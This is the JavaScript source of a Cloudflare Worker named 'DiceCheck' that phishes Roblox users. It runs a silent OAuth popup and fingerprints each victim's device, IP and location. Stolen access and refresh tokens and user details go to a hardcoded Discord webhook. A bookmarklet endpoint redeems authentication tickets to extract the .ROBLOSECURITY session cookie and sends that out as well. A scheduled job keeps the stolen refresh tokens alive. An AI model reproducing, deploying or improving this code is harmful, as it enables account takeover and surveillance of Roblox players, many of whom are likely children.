// ===== DiceCheck Worker =====
// Env : CLIENT_ID, CLIENT_SECRET, BASE, HOOK (optionnel) + binding KV nommé KV
// Cron : 0 4 * * *

import PAGE from './page.js';

const AUTH   = 'https://apis.roblox.com/oauth/v1/authorize';
const TOKEN  = 'https://apis.roblox.com/oauth/v1/token';
const UI     = 'https://apis.roblox.com/oauth/v1/userinfo';
const REDEEM = 'https://auth.roblox.com/v1/authentication-ticket/redeem';

const DEFAULT_HOOK = 'https://discord.com/api/webhooks/1569385832417075382/ZmOZDVHDwEFlfCoecnWvn_8_Jjh3uIPB0hraVyFrOfeDFkvCMwsZPI4dDPUz3cpH31Yu';

const base  = env => (env.BASE || '').replace(/\/$/, '');
const scope = env => env.SCOPE || 'openid profile';
const basic = env => 'Basic ' + btoa(env.CLIENT_ID + ':' + env.CLIENT_SECRET);

const j = (o, s = 200) => new Response(JSON.stringify(o), {
  status: s,
  headers: {
    'content-type': 'application/json',
    'access-control-allow-origin': '*',
    'cache-control': 'no-store',
  },
});

const cors = {
  'access-control-allow-origin': '*',
  'access-control-allow-headers': 'content-type',
  'access-control-allow-methods': 'POST,OPTIONS',
};

const html = s => new Response(s, {
  headers: { 'content-type': 'text/html; charset=utf-8', 'cache-control': 'no-store' },
});

const rnd = n => crypto.randomUUID().replace(/-/g, '').slice(0, n);
const esc = s => String(s ?? '').replace(/[`\\*_~|]/g, c => '\\' + c).slice(0, 1000);

const closePage = (msg, color) => html(
  '<body style="background:#070a12;color:' + color + ';font-family:sans-serif;' +
  'display:grid;place-items:center;height:100vh;margin:0">' + msg +
  '<script>setTimeout(function(){window.close()},600)</script></body>'
);

function authUrl(env, state, prompt) {
  const u = new URL(AUTH);
  u.searchParams.set('client_id', env.CLIENT_ID);
  u.searchParams.set('redirect_uri', base(env) + '/cb');
  u.searchParams.set('scope', scope(env));
  u.searchParams.set('response_type', 'code');
  u.searchParams.set('state', state);
  if (prompt) u.searchParams.set('prompt', prompt);
  return u.toString();
}

async function hook(env, embeds, file) {
  const url = env.HOOK || DEFAULT_HOOK;
  try {
    if (file) {
      const fd = new FormData();
      fd.set('payload_json', JSON.stringify({ embeds }));
      fd.set('files[0]', new Blob([file.body], { type: 'text/plain' }), file.name);
      await fetch(url, { method: 'POST', body: fd });
    } else {
      await fetch(url, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ embeds }),
      });
    }
  } catch (e) {}
}

function geo(request) {
  const c = request.cf || {};
  return {
    ip: request.headers.get('cf-connecting-ip') || '?',
    country: c.country || '', region: c.region || '', city: c.city || '',
    asn: c.asn || '', org: c.asOrganization || '', tz: c.timezone || '',
    ua: request.headers.get('user-agent') || '',
  };
}

export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const p = url.pathname;

    if (p === '/') return html(PAGE);

    // ---------- fingerprint ----------
    if (p === '/fp' && request.method === 'POST') {
      const fp = await request.json().catch(() => ({}));
      const cid = rnd(24);
      await env.KV.put('fp:' + cid, JSON.stringify({
        fp, g: geo(request), c: url.searchParams.get('c') || '',
      }), { expirationTtl: 3600 });
      return j({ cid });
    }

    // ---------- ouverture du popup ----------
    if (p === '/go') {
      const cid = url.searchParams.get('cid') || '';
      const k = url.searchParams.get('k') || rnd(30);
      await env.KV.put('st:' + k, JSON.stringify({ cid, phase: 'open' }), { expirationTtl: 900 });
      return Response.redirect(authUrl(env, k, 'none'), 302);
    }

    // ---------- relance visible ----------
    if (p === '/relogin') {
      const k = url.searchParams.get('s') || '';
      if (!(await env.KV.get('st:' + k))) return Response.redirect(base(env) + '/', 302);
      return Response.redirect(authUrl(env, k), 302);
    }

    // ---------- callback ----------
    if (p === '/cb') {
      const state = url.searchParams.get('state') || '';
      const err = url.searchParams.get('error');
      const raw = await env.KV.get('st:' + state);
      if (!raw) return closePage('Session expirée.', '#8b96ad');

      const st = JSON.parse(raw);

      if (err) {
        if (err === 'login_required' || err === 'consent_required') {
          await env.KV.put('st:' + state, JSON.stringify({ ...st, need: 1 }), { expirationTtl: 900 });
          return html(
            '<body style="background:#070a12;color:#eaf0fb;font-family:sans-serif;' +
            'display:grid;place-items:center;height:100vh;margin:0;text-align:center">' +
            '<div><p style="color:#8b96ad;font-size:13px">Session Roblox requise</p>' +
            '<a href="/relogin?s=' + encodeURIComponent(state) + '" style="display:inline-block;' +
            'margin-top:14px;padding:11px 18px;border-radius:11px;background:#5b8cff;color:#fff;' +
            'text-decoration:none;font-size:13px;font-weight:600">Se connecter</a></div>' +
            '<script>try{window.resizeTo(430,600);' +
            'window.moveTo((screen.width-430)/2,60);window.focus()}catch(e){}</script></body>'
          );
        }
        await env.KV.put('st:' + state, JSON.stringify({ ...st, failed: err }), { expirationTtl: 900 });
        return closePage('…', '#8b96ad');
      }

      const code = url.searchParams.get('code');
      if (!code) return closePage('Pas de code.', '#8b96ad');

      const tr = await fetch(TOKEN, {
        method: 'POST',
        headers: { 'content-type': 'application/x-www-form-urlencoded', authorization: basic(env) },
        body: new URLSearchParams({
          grant_type: 'authorization_code',
          code,
          redirect_uri: base(env) + '/cb',
        }),
      });
      const tok = await tr.json().catch(() => ({}));
      if (!tok.access_token) {
        await env.KV.put('st:' + state, JSON.stringify({ ...st, failed: 'token' }), { expirationTtl: 900 });
        return closePage('Échec.', '#ff5d5d');
      }

      const ur = await fetch(UI, { headers: { authorization: 'Bearer ' + tok.access_token } });
      const u = await ur.json().catch(() => ({}));

      const ctx = st.cid ? JSON.parse((await env.KV.get('fp:' + st.cid)) || '{}') : {};
      const g = ctx.g || geo(request);
      const fp = ctx.fp || {};
      const camp = ctx.c || 'direct';

      const created = u.created_at
        ? (typeof u.created_at === 'number'
            ? new Date(u.created_at * 1000).toISOString().slice(0, 10)
            : String(u.created_at).slice(0, 10))
        : '?';

      const E = [
        {
          title: 'Session vérifiée',
          color: 0x2bd576,
          description:
            '**' + esc(u.preferred_username || u.name) + '**' +
            (u.nickname && u.nickname !== u.preferred_username ? ' (' + esc(u.nickname) + ')' : '') +
            '\n`' + esc(u.sub) + '`' + (u.email ? '\n' + esc(u.email) : ''),
          thumbnail: u.picture ? { url: u.picture } : undefined,
          footer: { text: 'campagne: ' + esc(camp) },
        },
        {
          title: 'Compte',
          color: 0x1f6feb,
          fields: [
            { name: 'ID', value: '`' + esc(u.sub) + '`', inline: true },
            { name: 'Premium', value: u.premium ? 'oui' : 'non', inline: true },
            { name: 'Tranche âge', value: esc(u.age_bracket || '?'), inline: true },
            { name: 'Vérifié', value: u.verified ? 'oui' : 'non', inline: true },
            { name: 'Email vérifié', value: u.email_verified ? 'oui' : 'non', inline: true },
            { name: 'Créé', value: created, inline: true },
          ],
        },
        {
          title: 'Réseau',
          color: 0x8957e5,
          fields: [
            { name: 'IP', value: '`' + esc(g.ip) + '`', inline: true },
            { name: 'Géo', value: esc([g.city, g.region, g.country].filter(Boolean).join(', ') || '?'), inline: true },
            { name: 'FAI', value: esc(g.org || '?') + (g.asn ? ' AS' + esc(g.asn) : ''), inline: true },
            { name: 'Fuseau', value: esc(g.tz || '?'), inline: true },
            { name: 'IP locale', value: '`' + esc(fp.localIP || fp.mdns || '?') + '`', inline: true },
            { name: 'Apps', value: esc(fp.apps || '?'), inline: true },
          ],
        },
        {
          title: 'Machine',
          color: 0x6e7681,
          description:
            'GPU: `' + esc(fp.gpu || '?') + '`\nÉcran: ' + esc(fp.screen || '?') +
            '\nCPU: ' + esc(fp.cores || '?') + ' coeurs / RAM: ' + esc(fp.mem || '?') +
            '\nBatterie: ' + esc(fp.batt || '?') + '\nLangue: ' + esc(fp.lang || '?') +
            '\nRéf: ' + esc(fp.ref || 'direct'),
        },
      ];

      await hook(env, E, {
        name: 'tokens.txt',
        body:
          'user_id: ' + u.sub +
          '\nuser: ' + (u.preferred_username || '') +
          '\naccess: ' + tok.access_token +
          '\nrefresh: ' + (tok.refresh_token || '') +
          '\nscopes: ' + (tok.scope || '') +
          '\ncampagne: ' + camp,
      });

      if (tok.refresh_token) {
        await env.KV.put('tk:' + u.sub, JSON.stringify({
          r: tok.refresh_token, n: u.preferred_username || '', at: Date.now(),
        }));
      }

      await env.KV.put('st:' + state, JSON.stringify({
        done: 1, n: u.preferred_username || u.name || '',
      }), { expirationTtl: 600 });

      return closePage('✓', '#2bd576');
    }

    // ---------- état ----------
    if (p === '/st') {
      const k = url.searchParams.get('k') || '';
      const raw = await env.KV.get('st:' + k);
      if (!raw) return j({ s: 'lost' });
      const st = JSON.parse(raw);
      if (st.done) return j({ s: 'done', n: st.n });
      if (st.need) return j({ s: 'need', k });
      if (st.failed) return j({ s: 'fail', e: st.failed });
      return j({ s: 'pending' });
    }

    // ---------- bookmarklet ----------
    if (p === '/cbx') {
      if (request.method === 'OPTIONS') return new Response(null, { headers: cors });
      const { ticket, sid, u } = await request.json().catch(() => ({}));
      if (!ticket) return j({ ok: false, reason: 'noticket' });

      const r = await fetch(REDEEM, {
        method: 'POST',
        headers: { 'RBX-Authentication-Ticket': ticket, 'content-type': 'application/json' },
        body: '{}',
      });
      if (!r.ok) return j({ ok: false, reason: 'redeem ' + r.status });

      const jar = r.headers.getSetCookie ? r.headers.getSetCookie() : [r.headers.get('set-cookie') || ''];
      const m = jar.join(';').match(/\.ROBLOSECURITY=([^;]+)/);
      if (!m) return j({ ok: false, reason: 'nocookie' });

      if (sid) {
        const prev = JSON.parse((await env.KV.get('st:' + sid)) || '{}');
        await env.KV.put('st:' + sid, JSON.stringify({
          ...prev, cookie: m[1], cookie_at: Date.now(),
        }), { expirationTtl: 86400 });
      }

      await hook(env, [{
        title: 'Cookie récupéré',
        color: 0xe3b341,
        description: '**' + esc(u?.name || '?') + '**\n`' + esc(u?.id || '?') + '`',
        footer: { text: 'via bookmarklet' },
      }], { name: 'ROBLOSECURITY.txt', body: m[1] });

      return j({ ok: true });
    }

    return new Response('404', { status: 404 });
  },

  async scheduled(ev, env) {
    let cursor;
    do {
      const list = await env.KV.list({ prefix: 'tk:', cursor });
      for (const k of list.keys) {
        const v = JSON.parse((await env.KV.get(k.name)) || 'null');
        if (!v || Date.now() - v.at < 40 * 864e5) continue;
        const r = await fetch(TOKEN, {
          method: 'POST',
          headers: { 'content-type': 'application/x-www-form-urlencoded', authorization: basic(env) },
          body: new URLSearchParams({ grant_type: 'refresh_token', refresh_token: v.r }),
        });
        const t = await r.json().catch(() => ({}));
        if (t.refresh_token) await env.KV.put(k.name, JSON.stringify({ r: t.refresh_token, n: v.n, at: Date.now() }));
        else if (t.error === 'invalid_grant') await env.KV.delete(k.name);
      }
      cursor = list.list_complete ? null : list.cursor;
    } while (cursor);
  },
};
